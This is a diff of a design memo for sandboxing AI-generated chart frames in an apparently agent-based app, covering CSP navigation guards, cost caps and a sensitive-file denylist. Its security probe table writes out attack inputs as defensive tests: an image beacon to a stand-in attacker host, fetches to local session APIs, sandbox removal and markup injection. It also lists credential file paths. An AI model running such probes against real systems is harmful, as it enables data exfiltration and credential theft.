@@ -97,7 +97,8 @@ Each surface renders the components in an **opaque-origin sandbox**: `allow-scri
 CSP `default-src 'none'`, no bridge, and a per-surface **navigation guard** that allows the
 frame's initial load and denies every later navigation (Electron and native: stateful one-shot
 guards; relay web, which has no interception point for a subframe navigation: a parent-page CSP
-`frame-src data:` plus a second-`load` teardown — §4.1). The host injects a vendored prelude
+`frame-src data:` — declared in-document as a `<meta http-equiv>`, the only carriage the tunnel
+does not strip (§2.7) — plus the second-`load` teardown — §4.1). A vendored prelude is injected
 (stylesheet, tiny chart/table helpers, resize and theme glue). Theme tokens are pushed by
 `postMessage`, so every theme and every live switch is covered without regenerating anything.
 The TUI renders file callouts and any image components, and silently skips HTML.
@@ -140,9 +141,13 @@ needs onto the end event or onto a per-run record that `_emit` captures. Contrac
 `self._attention_outcome` (`session.py:12566`), and the subscriber reads it through a
 read-only accessor. `RunProvenance` carries the **logical turn's accumulated messages** —
 every loop run of the pipeline (first run plus each `_drain_continuation` run,
-`session.py:13831`), accumulated beside `_logical_generation` — because the held end is
+`session.py:13828`), accumulated beside `_logical_generation` — because the held end is
 replaced per run (`self._held_end = event`, `session.py:13496`) and would otherwise leave only
-the LAST run's messages (round-1 review R2). It does **not** add a field to
+the LAST run's messages (round-1 review R2). The accumulator is reset at the **pipeline head**
+beside `_run_triggers` (`session.py:13005-13008`) and is **not** cleared in `_flush_held_end`,
+which clears `_logical_generation` at `:13100` *before* the `_emit` at `:13106` that freezes the
+provenance — mirroring that neighbouring clear site freezes an empty accumulator and reproduces
+R2 silently (round-2 review R2-5). It does **not** add a field to
 `AgentEndEvent`; `extra="allow"` would make
 that harmless (`types.py:1893`), but it would leak a private fact onto every viewer's wire.
 
@@ -247,7 +252,7 @@ results and file writes, which the held end alone would lose (round-1 review R2)
 - **Dedup against visible.** Drop a candidate whose path string appears verbatim in the
   final answer's text inside a markdown link or code span. It is already visible outside the
   fold (UI `turn-segments.ts:417-424,504-514` keeps the answer row visible).
-- **Structured-data signal.** True iff the run's tool results or final answer contain at
+- **Structured-data signal.** True iff the logical turn's tool results or final answer contain at
   least one of:
   - (a) a markdown/CSV/TSV table with ≥ 3 data rows and a numeric column;
   - (b) a JSON array of ≥ 3 objects sharing ≥ 1 numeric key;
@@ -433,8 +438,9 @@ across jobs.
 - the user message (≤ 2k chars);
 - the final answer (≤ 6k chars);
 - the **evidence datasets**: `{id, title, source, columns, rows}` blocks the pre-filter
-  extracted from this run's tool results and featured files (≤ 200 rows and ≤ 24 KB each,
-  ≤ 64 KB total; text files only — CSV/TSV/JSON/markdown tables);
+  extracted from the **logical turn's** tool results and featured files (§2.1, the same
+  accumulator; ≤ 200 rows and ≤ 24 KB each, ≤ 64 KB total; text files only — CSV/TSV/JSON/
+  markdown tables);
 - for a steer, the user's instruction and the previous version's component sources.
 
 Datasets pass through `scrub_shapes` (`redaction_shapes.py:5112`) before leaving the
@@ -453,9 +459,10 @@ process, the same redaction boundary classification-layer §6 requires for outbo
 - `MAX_OUTPUT_TOKENS` 6000 per turn;
 - `MAX_COMPONENTS` 3;
 - `MAX_JOB_COST_USD` 0.20, a soft cap checked between turns against the ledger-priced
-  snapshot. The cap must clear the worst single turn (≈ $0.05) so the repair turn can start;
-  0.20 = 2 × the $0.08 high end of the measured job envelope + repair headroom (§5.3;
-  round-1 review R3).
+  snapshot. §5.3's envelope is **per job** (≈ $0.04-0.08 for the whole job, repair turn
+  included), so 0.20 = **2 × the $0.08 high end of that per-job envelope + $0.04 of headroom**.
+  It is not a per-turn figure with a third turn added, which is how the round-1 wording could
+  be read (round-1 review R3; round-2 R2-6).
 Any bound firing → `state=failed`, `error="bound:<name>"`, with valid blocks so far kept.
 
 **Fail-open.** Every exception → `failed`, a debug log, and no notice. A generator failure is
@@ -473,9 +480,15 @@ The prelude is:
 - `prelude.js`: `LO.table/bar/line/el/fmt/color/onTheme/onSize/size`, plus the width-redraw
   and theme listener.
 
-Measured on a working spike (Appendix C), after the round-1 updates — **2,045 B CSS +
-7,089 B JS raw (minified build); 4,067 B gzip combined. Budget: ≤ 10 KB raw, ≤ 4 KB
-gzip — both hold, with 29 B of gzip headroom; any addition must re-measure.**
+Measured on a working spike (Appendix C), after the round-2 label-layout fix — **2,044 B CSS +
+8,180 B JS raw (minified build, esbuild 0.28.2); 4,538 B gzip combined** (one method for every
+figure here: `cat` the pair through `gzip -9`; the spike's `BUILD.md` carries it, `measure.py`
+re-derives it). Budget: **≤ 11 KB raw / ≤ 4.5 KB gzip** — 1,040 B and 70 B spare. Round 2 moved
+the caps: D2-1's anchoring fix (measure the composed top-tick label, reserve its width, fall
+back inside the plot when the space is short) plus D2-2/D2-4's label fitting cost **+474 B gzip /
++1,089 B raw** against the pre-fix pair through the same tool, and the old caps had 29 B of gzip
+headroom. The caps are self-imposed; that fix is not. Any further addition must trim rather than
+extend — the App. B guard (+412 B gzip) still does not fit.**
 
 Trade-offs:
 
@@ -622,9 +635,12 @@ class SupplementProgressEvent(AgentEvent[Literal["supplement_progress"]]):
 
 **Tunnel header stripping is not a problem by design.** The gateway forwards a fixed
 response-header set (`tunnels/gateway.py:320-329`) and overwrites CSP with
-`frame-ancestors 'none'` (`:668-671`). The frame CSP rides **inside the document** (`<meta>`);
-the iframe `csp` attribute is not used — it is not implemented in Chromium (round-1 review),
-so no response header and no unimplemented attribute is relied on.
+`frame-ancestors 'none'` (`:668-671`), so **every** policy this feature relies on rides inside
+a document as `<meta http-equiv="Content-Security-Policy">` — the frame's own policy (§4.1)
+*and*, on the relay, the **parent page's** `frame-src data:` (§4.1's Relay row), which a
+response header would lose in transit (round-2 R2-3). The iframe `csp` attribute is not used —
+it is not implemented in Chromium (round-1 review), so no response header and no unimplemented
+attribute is relied on.
 
 **Control ops (new; runtime dispatch, `session/runtime/server.py` after `:7115`):**
 
@@ -660,7 +676,7 @@ known, graphics queued" (which paints as `queued`).
 | user cancel (`cancelled`, no error or a non-`superseded` error) | `Highlights cancelled · Retry` (neutral ink, never error ink) |
 | superseded (`error="superseded"`) | nothing — the line disappears silently; no Retry under an answer the user moved past |
 | failure (any other error) | `Couldn't prepare highlights · Retry` |
-| frame-level `{t:"error"}` or a torn-down frame (§4.1) | the frame is replaced by one quiet line, `Couldn't render this graphic`; a `supplement_restart` Retry is offered when the job is settled |
+| frame-level `{t:"error"}`, or a torn-down or hung frame (§4.1/§4.2) **with the job settled `done`** | the frame is replaced by one quiet line, `Couldn't render this graphic`; a `supplement_restart` Retry is offered when the job is settled. **Precedence (round-2 R2-4):** the row's committed `state` decides which line renders — a job-level `failed` (including the relay's hostile-navigation teardown, §4.1) renders the failure line above, never this one, and this line never rewrites a settled row |
 | `skipped`/dismissed | nothing |
 
 Steer and cancel render as a **pair** — `Adjust…` · `Cancel`, one `text-meta`/`ink-dim` line — never one hover-only while the other persists; on touch surfaces both are visible, tap targets ≥ 44 px (D10).
@@ -792,7 +808,7 @@ default constant beside its consumer and a `_consumer_defaults` entry (`AGENTS.m
 | `supplements.maxTurns` | int / `2` | 1..4 |
 | `supplements.maxOutputTokens` | int / `6000` | per generator turn |
 | `supplements.timeoutS` | int / `90` | whole job |
-| `supplements.maxCostUsd` | float / `0.20` | soft per-job cap — clears the worst single turn so the repair turn can start; §5.3, round-1 R3 |
+| `supplements.maxCostUsd` | float / `0.20` | soft per-job cap — 2 × the measured **per-job** high end ($0.08) plus $0.04 of headroom, so a job inside its envelope is never stopped mid-repair; §5.3, round-1 R3/round-2 R2-6 |
 | `supplements.maxFeatured` | int / `4` | the "N more" threshold |
 | `supplements.denyPrefixes` | list[str] / `[]` | paths under these prefixes are never candidate files — the adoption knob for a machine holding customer data (round-1 S-R8) |
 
@@ -820,7 +836,7 @@ Disposition: **C** = code in that lane's PR; **V** = verified (no code); **F** =
 
 | # | Seam | File:line | Change | Disp. |
 |---|---|---|---|---|
-| 1 | Run provenance | `session.py:11733-11756` (`_note_run_input`), `:13005-13008` (reset) | add `_run_typed_user`, `_run_last_trigger`; accumulate the logical turn's messages beside `_logical_generation` (R2); freeze `RunProvenance` in `_emit` beside `_attention_outcome` (`:12566`) | C |
+| 1 | Run provenance | `session.py:11733-11756` (`_note_run_input`), `:13005-13008` (the accumulator's reset point) | add `_run_typed_user`, `_run_last_trigger`; accumulate the logical turn's messages beside `_logical_generation`, reset at the pipeline head and **never** in `_flush_held_end` (`:13100` clears `_logical_generation` before the `:13106` `_emit` freezes it; R2/R2-5); freeze `RunProvenance` in `_emit` beside `_attention_outcome` (`:12566`) | C |
 | 2 | Settled signal | pipeline `finally`, after `on_turn_settled` (`session.py:13076-13089`) | set `self._turn_settled` (an `asyncio.Event`); cleared at pipeline head | C |
 | 3 | Trigger | `serving.py:3100-3101` | `_maybe_supplement(event)` beside `_maybe_judge_goal`; schedules only | C |
 | 4 | Runner | new `session/runtime/supplements.py` (`SupplementRunner`) held as `_supplement_task` | cancel on dispose (`serving.py:1555-1565`); NOT in `_background_tasks` | C |
@@ -921,14 +937,22 @@ inspects the request body at the data (§4.4 S17).
   img-src data:; font-src data:; connect-src 'none'; frame-src 'none'; form-action 'none';
   base-uri 'none'` (`'unsafe-inline'` is safe here only *because* the origin is opaque and
   the network is closed);
-- **the frame's own navigation is bounded per surface (round-1 R1/S-R1).** The sandbox and
-the document CSP do **not** cover it: `sandbox="allow-scripts"` lets a frame navigate
-*itself* (the sandboxed-navigation flag covers navigation of *other* contexts), and CSP
-governs subresources, not navigation (`navigate-to` is unimplemented in Chromium; the
-`<iframe csp>` attribute is unimplemented too and is not relied on). Per surface:
+- **the frame's own navigation is bounded per surface (round-1 R1/S-R1; dispatch corrected in
+  round-2 S-R2-1).** The sandbox does **not** cover it (`sandbox="allow-scripts"` lets a frame
+  navigate *itself*: the sandboxed-navigation flag covers navigation of *other* contexts), and
+  neither does the frame's **own** document CSP — `navigate-to` is unimplemented in Chromium and
+  the `<iframe csp>` attribute is unimplemented too, so neither is relied on. But the
+  **embedding** document's `frame-src` does govern it: Chromium checks every navigation of an
+  already-loaded child frame — script-, `meta refresh`- and embedder-initiated alike — and
+  blocks it **before the request is issued**, reporting the violation to the embedding document
+  (measured on Chrome 155 with the target server seeing nothing; longstanding,
+  w3c/webappsec-csp#509). That distinction is the whole reason the relay's `frame-src data:`
+  line is a control and not decoration. Per surface:
 **Electron** — a stateful one-shot `will-frame-navigate` guard (below); **native** — a
 one-shot `onShouldStartLoadWithRequest` rule (below); **relay web**, which has no
-interception point for a subframe navigation — a parent-page CSP `frame-src data:` plus a
+interception point for a subframe navigation — a parent-page CSP `frame-src data:`, declared
+in-document as `<meta http-equiv="Content-Security-Policy" content="frame-src data:">` in
+`mobile/web/index.html` (a response header is overwritten in transit, §2.7), plus a
 second-`load` teardown (below). Belt-and-braces on the desktop too: the guard is primary,
 and any frame whose navigation counter has moved has its messages dropped and is unmounted
 as hostile — a guard bug must not silently become an exfil path;
@@ -941,12 +965,23 @@ as hostile — a guard bug must not silently become an exfil path;
   the binding, alongside `event.origin === "null"` (round-1 S-R4). The nonce never appears
   in the URL: a navigated document cannot read it from `location`, and a re-navigation to a
   `data:` URL carrying the host's fragment is denied by the one-shot guard;
-- the host sends only `{lo:"supplement-host", t:"theme", mode, vars, nonce}`.
+- the host sends only `{lo:"supplement-host", t:"theme", mode, vars, nonce}` and
+  `{t:"ping"}`; the frame answers `{lo:"supplement", v:1, t:"pong"}` (§4.2's watchdog, one
+  outstanding at a time, never coalesced away; round-2 S-R2-5).
+- **what remains unprovable (round-2 S-R2-3).** These checks prove *browsing-context
+  continuity*: the nonce never left the original document, a successor cannot hold it (the only
+  allowed navigation is the byte-matched mount load and every other is denied), and messages
+  from a moved frame are dropped. They do **not** prove *document provenance*: every document in
+  a sandboxed frame presents `Origin: null` behind the same `contentWindow`, so a guard or event
+  path the host misses would be invisible to the binding. That residual is why S8/S13 stay live,
+  and why the Electron event coverage — measured on Electron 44.3.0: `will-frame-navigate` fires
+  for the mount load and for a self-navigation, and `event.preventDefault()` stops it
+  pre-request — is **re-asserted per release**, not only at introduction.
 
 | Surface | Delivery | Why this one (evidence) |
 |---|---|---|
 | **UI (Electron renderer)** | `<iframe sandbox="allow-scripts" src="data:text/html;base64,…">` — the delivery **P1 decides** between (1) the `data:` URL, (2) a dedicated custom protocol, (3) `blob:`. The html comes from `sessions.supplementDocument` via main (bearer added in main); the CSP meta rides inside the document. | **Acceptance, settled at P1:** *the initial document loads AND the CSP is enforced* (the inline component script runs under the document's own policy; no embedder-policy inheritance surprise). The spec basis is contested — fetch's "is local" includes `data:`, whose policy-container step would inherit the initiator's CSP list, while Chromium has drifted by navigation method (crbug 40053796) — and the memo asserts neither reading. `srcdoc` inherits the renderer's `script-src 'self' …` (UI `index.html:31-32`) and is rejected. **Option 2's requirements are fixed now:** `registerSchemesAsPrivileged({scheme:"lo-supplement", privileges:{standard:true, secure:false, corsEnabled:false, bypassCSP:false}})`, its handler serves only stored digests with the §4.1 document policy as a response header + `X-Content-Type-Options: nosniff` + `Cache-Control: no-store`, and the frame keeps `sandbox="allow-scripts"` so the origin stays opaque either way. `secure:true` is the one to avoid: a secure context re-opens `RTCPeerConnection` (CSP does not govern WebRTC), `navigator.clipboard` and `crypto.subtle`. P1 records `window.isSecureContext` and `typeof RTCPeerConnection` for the winner — those are what decide whether the fallback is a downgrade (§9). Size: ≤ 64 KB documents are fine as data: URLs. |
-| **Relay web** | `<iframe sandbox="allow-scripts" src="data:text/html;base64,…">` (same as UI), HTML fetched as JSON from the relay route. **Never** a relay-served `text/html` URL. **Navigation control (this host has no interception point):** the relay page adds a parent-document CSP `frame-src data:` (the page frames nothing else today), so a navigation of the supplement frame to `http(s)` is blocked by CSP; and the host counts the frame's `load` events — the **second** `load` is a hostile navigation: tear the frame down, settle the job to `failed`, one debug line (round-1 R1/S-R1). | The relay has no CSP meta (`mobile/web/index.html`, verified: no CSP, no existing frames), so srcdoc would also work there. One delivery for both web hosts is chosen to keep the code path and the security probe single. An opaque origin sends `Origin: null`, which fails `cross_origin_mutation` (`daemon.py:4188-4205` *(scout)*) and the gateway's origin check (`gateway.py:583-595` *(scout)*). Tunnel header stripping is irrelevant because the CSP rides in-document (§2.7). |
+| **Relay web** | `<iframe sandbox="allow-scripts" src="data:text/html;base64,…">` (same as UI), HTML fetched as JSON from the relay route. **Never** a relay-served `text/html` URL. **Navigation control (this host has no interception point):** the relay page adds a parent-document CSP `frame-src data:` **as a `<meta http-equiv>` in `mobile/web/index.html`** — a response header does not survive the tunnel (§2.7) — and that policy is the **load-bearing** control: the embedding document's `frame-src` governs navigations of an already-loaded child frame (script-, `meta refresh`- and embedder-initiated alike) and blocks them **before the request is issued** (measured on Chrome 155; w3c/webappsec-csp#509). The host also counts the frame's `load` events — the **second** `load` is a hostile navigation **or a blocked attempt** (measured: a blocked navigation fires a second `load` too) — so it tears the frame down, settles the job to `failed`, one debug line; the teardown is the belt, the CSP is the control (round-1 R1/S-R1; round-2 S-R2-1). | The relay has no CSP meta (`mobile/web/index.html`, verified: no CSP, no existing frames), so srcdoc would also work there. One delivery for both web hosts is chosen to keep the code path and the security probe single. An opaque origin sends `Origin: null`, which fails `cross_origin_mutation` (`daemon.py:4188-4205` *(scout)*) and the gateway's origin check (`gateway.py:583-595` *(scout)*). Tunnel header stripping is irrelevant because every policy rides in-document (§2.7). |
 | **Native** | `react-native-webview` with `source={{html, baseUrl:"about:blank"}}`, `originWhitelist={["about:*"]}` (P4), `javaScriptEnabled`, `incognito`, `sharedCookiesEnabled={false}`, `thirdPartyCookiesEnabled={false}`, `allowFileAccess={false}`, `allowUniversalAccessFromFileURLs={false}`, `setSupportMultipleWindows={false}`, `onShouldStartLoadWithRequest` → **one-shot**: allow exactly the first request, deny everything after (not URL-matched — see below), `onOpenWindow` deny, **no `injectedJavaScript`**. Theme is pushed with `postMessage(JSON)`. The prelude listens on both `window` and `document` `message` events (an Android quirk), and its outbound calls use `window.ReactNativeWebView.postMessage` when present. | There is no WebView today (`package.json:36-69` *(scout)*). The tunnel credential is set per-fetch by the app (`profile.ts:257-297` *(scout)*), so an incognito WebView holds no credential. Whether it shares the platform cookie jar on the custom route is probe P5; `incognito` + `sharedCookiesEnabled=false` is the belt either way. |
 | **TUI** | HTML is never rendered. Image components only (none generated in v1, §8). | — |
 
@@ -1010,7 +1045,9 @@ not the scanner.
 flooding or hanging the reader: the host accepts at most **one `resize`/`error` per frame
 per animation frame — latest-wins, the rest dropped** (the prelude already rAF-coalesces
 its own posts), and a **watchdog** armed at mount unmounts a frame that never posts `ready`,
-or that fails to answer a ping within 5 s, into the failed state (§2.8's fallback line).
+or that fails to answer a ping within 5 s, into §2.8's **frame-level** fallback line — it never
+rewrites a settled row (round-2 R2-4). The ping is `{t:"ping"}` → `{t:"pong"}` on the §4.1
+message wire, one outstanding at a time, never coalesced away (round-2 S-R2-5).
 
 ### 4.3 The sensitive denylist (server-side, before the decision)
 
@@ -1044,7 +1081,12 @@ composes the two existing lists instead of inventing a third:
   `.env.local`, `id_ed25519.pub`, `~/.aws/credentials`, `secrets/x.json`, `PROD.ENV`,
   `.config/gh/hosts.yml`, `.docker/config.json`, `application_default_credentials.json`, a
   symlink `report.md → ~/.ssh/id_rsa` — the expected `is_sensitive()` result **and the rule
-  id that produced it**; a denylist gap is only visible at the data.
+  id that produced it**; a denylist gap is only visible at the data. The table also carries the
+  **relocated-config-dir case** (round-2 S-R2-4): a case that sets `LOCAL_OPERATOR_CONFIG_DIR`
+  to a temp dir and asserts **nothing under it is ever listed or sent** — the direct test of
+  "every root computed from live accessors, never a literal", because a hard-coded
+  `~/.local-operator` passes every non-relocated fixture and still leaks the secret store
+  under a relocation.
 
 The predicate is evaluated on the **resolved** path (symlinks followed) **and** on the path
 as written. Either matching denies.
@@ -1062,16 +1104,16 @@ what actually leaves or is served.
 | S2 | `fetch("http://127.0.0.1:1111/v1/desktop/sessions")` / `:8080` / relay `/api/sessions` | UI, relay, native |
 | S3 | `fetch("/api/sessions/<id>/command",{method:"POST",…})` (same-origin attempt) | relay |
 | S4 | `new Image().src="https://attacker/?d="+data`; CSS `background:url(https://…)`; `@import`; `<link rel=prefetch>`; DNS-prefetch | all |
-| S5 | `location="https://…"` — the frame navigating **itself**. Blocked by the navigation guard per surface (Electron: stateful one-shot `will-frame-navigate`; native: one-shot deny; relay: parent CSP `frame-src data:` + second-`load` teardown). `top.location=…`, `<a target=_top>` click, `<meta refresh>`-to-top: blocked by the sandbox flags. The in-document CSP does not cover navigation — this row measures the guard, not the CSP (round-1 R1/S-R1) | all |
+| S5 | `location="https://…"` — the frame navigating **itself**: Electron/native block it at the one-shot guard (`will-frame-navigate` / `onShouldStartLoadWithRequest`); on relay the **parent document's `frame-src data:`** blocks it **before the request is issued** and reports to the parent, with the second-`load` teardown as the belt (measured on Chrome 155; the relay's WebKit/other browsers are still open — the row names the engine verified, and probe P10 closes the matrix). `<meta refresh>` is self-directed (there is no "to-top" form) and takes the **same** control as `location=`; `top.location=…` and `<a target=_top>` clicks navigate *another* context, so the sandbox flags stop them. `data:`→`data:` self-navigation is the one class the policy allows: the hop inherits the previous document's policy container, so its subresource beacon is blocked too (measured) — a beacon that left during the hop's parse would not be, which is why the teardown stays (round-1 R1/S-R1; round-2 S-R2-1/S-R2-2) | all |
 | S6 | `window.open`, `<a target=_blank>`, `form.submit()` | all |
 | S7 | Remove the sandbox: `frameElement.removeAttribute("sandbox")`, nested `<iframe srcdoc>` with `allow-same-origin` | UI, relay |
 | S8 | Forged host message: the frame posts `{lo:"supplement-host",…}` to itself / to parent with a huge `h`, NaN, negative; a **state-moving message without (or with a stale) nonce is dropped** (S-R4); message flood (10k/s) | all |
 | S9 | Theme vars injection: `vars:{"--lo-x":"red;}</style><script>"}` (host side is trusted, but verify the prelude's whitelist) | all |
 | S10 | `document.cookie`, `localStorage`, `indexedDB`, `caches` | all |
 | S11 | `navigator.clipboard`, `requestFullscreen`, `alert/confirm/prompt`, `print()`, download via `a[download]` | all |
-| S12 | CPU/memory DoS: `while(1){}`, 1 GB allocation, and a 10k messages/s flood with no ping answer → host stays responsive via per-frame coalescing + the 5 s watchdog (§4.2); the Chromium OOPIF for an opaque-origin frame is probe P6 | UI, relay |
+| S12 | CPU/memory DoS: `while(1){}`, 1 GB allocation, and a 10k messages/s flood with **no `{t:"pong"}` answer** to the host's `{t:"ping"}` (§4.1's wire) → host stays responsive via per-frame coalescing + the 5 s watchdog (§4.2); the Chromium OOPIF for an opaque-origin frame is probe P6 | UI, relay |
 | S13 | Native: `onShouldStartLoadWithRequest` bypass via `window.location`, `about:blank` re-navigation, `intent://`, `file:///` — all denied by the one-shot rule; **plus: re-navigate to a `data:` URL that copies the host's fragment, then post `{t:"error"}` → no host state changes** (S-R4) | native |
-| S14 | Denylist, as the **table fixture** of §4.3 (each name + expected `is_sensitive()` + rule id); then a turn that writes them → none listed, none sent to the vendor (inspect the decision request body) | core |
+| S14 | Denylist, as the **table fixture** of §4.3 (each name + expected `is_sensitive()` + rule id, **including the relocated-`LOCAL_OPERATOR_CONFIG_DIR` case**); then a turn that writes them → none listed, none sent to the vendor (inspect the decision request body) | core |
 | S15 | File route: `/supplements/<job>/file?i=<out of range>`, `?i=-1`, digest of another session, path traversal in the job id; plus a `.txt` whose body begins `<!doctype html><script>…` → rendered as text, non-scriptable `Content-Type` + `nosniff` (S-R6) | relay |
 | S16 | Generated text containing a fake credential shape → `scrub_shapes` masks it in evidence | core |
 | S17 | Decision egress: a turn with a deliverable under `~/clients/<name>/…`; inspect the decision request body — basenames, sizes, writing tools, answer text only: no directories, no file contents, no tool output (round-1 S-R8) | core |
@@ -1088,6 +1130,15 @@ what actually leaves or is served.
 auto-continued** pre-filters over the accumulated logical-turn messages — the
   pre-compaction tool results and file writes stay in input (assert against `RunProvenance`,
   never the held end).
+- **Prelude label layout (round-2 D2-1/D2-2/D2-4):** on identical data, a unit-swap pair
+  (`req/s` vs `ms`) asserts every axis label's painted box stays inside the frame — the composed
+  top-tick label included — at 620, 320 and 220 px; and that a category label is truncated only
+  when its slot cannot hold it, with the 300/220 px collision fixture (the forced last label
+  dropped rather than overlapped). Unit test on the built prelude (App. C), plus the rendered
+  pair in the QA matrix (§5.4).
+- **Wire liveness (round-2 S-R2-5):** the frame answers `{t:"ping"}` with `{t:"pong"}`, and a
+  frame that does not is unmounted by the 5 s watchdog into the **frame-level** fallback line
+  (§4.2) — never a rewrite of the settled row.
 - **Exec unchanged:** `lop exec` text and `--json` golden output byte-identical before/after
   on a turn that *would* qualify (scripted provider). No `supplement_progress` line on
   `--json`.
@@ -1177,8 +1228,9 @@ explicitly. A one-line opt-in for "files I edited" is not in v1.
   - decision ≈ $0.0001/eligible turn (the classification layer's documented range);
   - generator ≈ 9-15k input + 1-2.5k output tokens/job, so at Sonnet-class list prices
     ≈ $0.04-0.08/job.
-  - This is why `maxCostUsd` defaults to **0.20** — 2 × the $0.08 high end plus repair
-    headroom (round-1 R3) — and the open question Q1 exists.
+  - This is why `maxCostUsd` defaults to **0.20** — 2 × the $0.08 high end of the per-job
+    envelope plus $0.04 of headroom, both figures per job (round-1 R3; round-2 R2-6) — and the
+    open question Q1 exists.
 
 ### 5.4 QA matrix (qa-tester, per lane, real app)
 
@@ -1205,7 +1257,10 @@ means before/after frames, the brand themes plus 2 others, and a frame mid-theme
 - light/dark at the measured extremes (localOperatorLight + kanagawaLotus;
   localOperatorDark + everforest) plus a frame mid-theme-switch — and an "OS preference
   opposite the app theme" case per surface (round-1 D8);
-- narrow: 320 px and the 220 px canvas-open column, with a live drag (per D3); reduced motion /
+- narrow: 320 px and the 220 px canvas-open column, with a live drag (per D3); the label
+  fixtures (D2-1/D2-2) — a long-unit chart (`150 req/s` on the top tick, which clipped at every
+  width before the round-2 fix) and the six-long-category collision fixture at 300 and 220 px;
+  reduced motion /
   no shimmer; the mesh row ("on <peer>", preview disabled); TUI copy parity (same fixed
   strings, no hover affordances; files-only shows no reserved gap);
 - each series' values readable without hover, on a touch surface (round-1 D14).
@@ -1270,16 +1325,24 @@ reproductions. A UI or native lane **cannot merge** with any S-finding open at b
   option 2 (the custom protocol, §4.1) — about one more main-process PR. The detector is
   the U-b QA frame plus the `ready` message never arriving (the host logs it); P1 records
   `isSecureContext` and `typeof RTCPeerConnection` for the winner.
-- **Self-navigation (R1/S-R1).** A sandboxed frame can navigate itself; every surface ships
-  its navigation control before frames mount (Electron/native: one-shot guards; relay:
-  parent CSP + second-`load` teardown). A failure here is a security hold, not a QA nit.
-- **Prelude size budget.** The build sits 29 B under the gzip cap (4,067/4,096; §2.6). Any
-  addition — including the App. B accent guard (≈ +430 B gzip) — must re-measure; the guard
-  is deliberately not in v1.
+- **Self-navigation (R1/S-R1; dispatch corrected in round 2).** A sandboxed frame can navigate
+  itself; every surface ships its navigation control before frames mount — Electron/native:
+  one-shot guards; relay: the parent page's `frame-src data:` **meta** (it blocks the navigation
+  before the request is issued; measured, §4.1) with the second-`load` teardown as the belt. The
+  frame's *own* CSP does not constrain its own navigation, so a reader who takes that sentence
+  for the embedding policy's too deletes the relay's only pre-request control. A failure here is
+  a security hold, not a QA nit.
+- **Prelude size budget.** The build is 4,538 B gzip against the re-stated ≤ 4.5 KB cap (70 B
+  spare) and 10,224 B raw against ≤ 11 KB (1,040 B spare); caps, method and why they moved are
+  in §2.6. Any addition must re-measure and, at this margin, trim: the App. B accent guard is
+  **+412 B gzip measured on that same method** (the spike's `measure.py`), so it is still
+  deliberately not in v1. This is the round-2 residue with the widest blast radius — the cap
+  move is a design decision the reviewer should confirm, not a coder's convenience.
 - **Accent adjacency (D11).** Supplement frames do not share a rendered view with the app's
   accent-drawn charts in v1 (the chart idiom is used in settings, the projects timeline and
   the analytics dialog, which presents *over* chat; none renders beside the transcript). If
-  a surface ever shows both, guard slot 1 (App. B; measured at ≈ +430 B gzip, so it lands
+  a surface ever shows both, guard slot 1 (App. B; measured at **+412 B gzip** with §2.6's one
+  method — the spike's `measure.py` — so it lands
   with that surface, under the size test).
 - **Spam drift.** Decision quality is model judgment. Watch `dismissed/shown` and Retry
   counts weekly for the first month. `GRAPHICS_THRESHOLD`/`FILE_PROB_FLOOR` are policy
@@ -1346,6 +1409,7 @@ reproductions. A UI or native lane **cannot merge** with any S-finding open at b
 | P7 | Which `tui/app.py` handler receives unknown `AgentEvent` types, and where does an answer block expose its anchor for live mounting? | read `on_assistant_message_end` (`tui/app.py:53879`) and the event dispatch (file is over grep's cap; use `sed` ranges) | T |
 | P8 | The pre-filter absorption rate on real sessions | run `supplements/candidates.py` offline over the last 500 eligible turns in the operator's journals (read-only) | C1 |
 | P9 | Cost of the relay route's "digest referenced by this session" check on large journals | time a byte `rfind` scan on a 260 MB journal, the transcript reader's own measurement pattern (`transcript.py:1075-1120`) | C2 |
+| P10 | The relay's **browser matrix** for the parent-document `frame-src` navigation block: Chromium is verified (Chrome 155, round-2 S-R2-1) but WebKit and Gecko are not — S5's row records the gap rather than implying coverage | re-run the round-2 probe rig (a parent page + a sandboxed `data:` child at a second local port, beacons logged server-side) in WebKit and Gecko; record the pre-request block and the second-`load` behaviour per engine | U-a/U-b |
 
 ---
 
@@ -1381,7 +1445,7 @@ bounded scan of the run's messages (target ≤ 5 ms, measured in C1's evidence).
 
 | # | Question | Recommendation |
 |---|---|---|
-| Q1 | **Default-on for graphics, and the per-job cap.** Files are free; graphics cost ≈ $0.04-0.08 per generated job at Sonnet-class (estimate, §5.3), and only on eligible turns that pass the decision. | `supplements.enabled=true`, `files=true`, **`graphics=true` once a renderer ships** (§6), `maxCostUsd=0.20` (2 × the envelope high end + repair headroom; R3 — the cap is only checked between turns). Add a daily cap only if the dogfood week shows > $1/day. |
+| Q1 | **Default-on for graphics, and the per-job cap.** Files are free; graphics cost ≈ $0.04-0.08 per generated job at Sonnet-class (estimate, §5.3), and only on eligible turns that pass the decision. | `supplements.enabled=true`, `files=true`, **`graphics=true` once a renderer ships** (§6), `maxCostUsd=0.20` (2 × the per-job envelope high end + $0.04 headroom; R3, units per R2-6 — the cap is only checked between turns). Add a daily cap only if the dogfood week shows > $1/day. |
 | Q2 | **Which model "auto" prefers** when several design-capable models are logged in (the ladder order in §2.5). | Sonnet-class first: the best measured HTML/SVG quality per dollar in prior design work. Revisit with the §5.3 arms. |
 | Q3 | **The user-facing name.** | "Highlights" (§0). The alternative is "Supporting graphics" if the files half should stay unnamed. |
 | Q4 | **Should answering a queued ask make the follow-up answer eligible?** The answer is the operator's input, but it replies to the agent's question. | No in v1 (precision). Revisit if the dogfood week shows missed charts after ask answers. |
@@ -1412,7 +1476,7 @@ HONESTY (hard rules)
 
 PICK THE FORM
 - Compare categories: bar (horizontal when labels are long or >6 bars). Change over time: line. Part of whole with ≤5 parts: stacked bar, never pie/donut. Distribution: histogram-style bar. Exact lookup, >12 rows or mixed units: table. Flow/steps: simple ordered list or small SVG diagram.
-- One idea per component. Lead with the answer's main point in a short title (sentence case, no trailing period); pass it as `title` — the helper prints it visibly. Keep category labels ≤ 12 characters; the helper thins and truncates longer ones, with the full text kept in the tooltip.
+- One idea per component. Lead with the answer's main point in a short title (sentence case, no trailing period); pass it as `title` — the helper prints it visibly. Keep category labels ≤ 12 characters (this is a guide for the writing, not a render rule: the helper thins labels by width and truncates one only when its slot cannot hold it, keeping the full text in the tooltip).
 - Axis/columns name the quantity AND unit ("Latency (ms)"). Start bar axes at zero. Sort bars by value unless order is meaningful.
 - ≤6 series. Colour never carries meaning alone: label series directly or use LO.line's dash patterns and the legend.
 - Dense data → table with right-aligned tabular numerals (LO.table does this).
@@ -1422,7 +1486,7 @@ LOOK
